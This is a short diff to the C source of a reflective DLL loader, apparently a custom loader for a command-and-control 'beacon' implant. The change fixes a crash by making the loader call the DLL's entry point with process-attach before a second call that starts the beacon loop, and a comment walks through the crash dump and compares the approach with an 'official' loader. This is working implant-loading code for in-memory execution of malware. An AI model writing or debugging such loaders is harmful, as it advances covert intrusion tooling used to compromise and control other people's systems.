@@ -518,9 +518,15 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     if (pFlush && pGetCur)
         pFlush(pGetCur(), NULL, 0);
 
-    /* reason 4 = DLL_METASPLOIT_ATTACH: our DllMain starts beacon() here
-     * and is contracted never to return. ExitThread is the last fence. */
+    /* AddressOfEntryPoint is DllMainCRTStartup, not our DllMain. The CRT
+     * only creates its heap / runs initializers on DLL_PROCESS_ATTACH; a
+     * first call with reason 4 (the previous dump) left the heap handle
+     * NULL and ntdll crashed on `cmp [rbx+10h], 0DDEEDDEEh` with rbx=0.
+     * Official UDRL does PROCESS_ATTACH inside the loader and returns the
+     * EP so the DOS stub can call reason 4; we do both here because our
+     * DllMain starts the beacon loop on reason 4 and must not return. */
     dllmain = (BW_DLLMAIN)(sc_base + opt->AddressOfEntryPoint);
+    dllmain((void *)sc_base, DLL_PROCESS_ATTACH, lpParameter);
     dllmain((void *)sc_base, 4, lpParameter);
     if (pET != NULL)
         pET(0);
